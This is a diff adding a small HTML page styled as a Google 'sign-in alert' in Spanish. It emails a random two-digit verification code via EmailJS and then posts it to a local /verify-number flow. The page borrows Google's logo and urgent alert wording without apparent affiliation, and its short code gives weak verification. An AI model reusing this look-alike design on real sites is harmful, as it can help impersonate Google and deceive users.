@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentication</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+
+        .google-logo {
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+
+        h1 {
+            color: #202124;
+            font-weight: 400;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        h2 {
+            color: #202124;
+            font-weight: 400;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        input[type="submit"] {
+            margin-top: 20px;
+            padding: 10px 24px;
+            font-size: 16px;
+            background-color: #4285F4;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #357ae8;
+        }
+
+        #number {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
+        <h1>¡Alerta de inicio de sesión!</h1>
+        <h2>Por favor, confirma tu identidad ingresando el código que te enviaremos tras hacer clic en el siguiente botón.</h2>
+        <form id="form" action="/number" method="POST">
+            <input type="text" name="number" id="number">
+            <input type="submit" id="button" value="Send Email">
+        </form>
+    </div>
+
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        emailjs.init('R1QTDvEB_8yd_-BHw');
+
+// Asignar número aleatorio al campo 'number' automáticamente
+document.getElementById('number').value = Math.floor(Math.random() * 100);
+
+const btn = document.getElementById('button');
+
+document.getElementById('form').addEventListener('submit', function (event) {
+    event.preventDefault(); // Evita el envío del formulario por defecto
+
+    btn.value = 'Sending...';
+
+    const serviceID = 'default_service';
+    const templateID = 'template_j23jq8r';
+
+    // Enviar el correo electrónico primero
+    emailjs.sendForm(serviceID, templateID, this)
+        .then(() => {
+            // Cuando el correo electrónico se envíe exitosamente
+            btn.value = 'Send Email';
+            
+            // Ahora, enviar el formulario al servidor
+            fetch('/number', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: new URLSearchParams(new FormData(this))
+            })
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = '/verify-number'; // Redirige a la página de verificación
+                } else {
+                    alert('Error al enviar el formulario');
+                }
+            })
+            .catch(error => console.error('Error:', error));
+        }, (err) => {
+            btn.value = 'Send Email';
+            alert(JSON.stringify(err));
+        });
+});
+    </script>
+</body>
+
+</html>
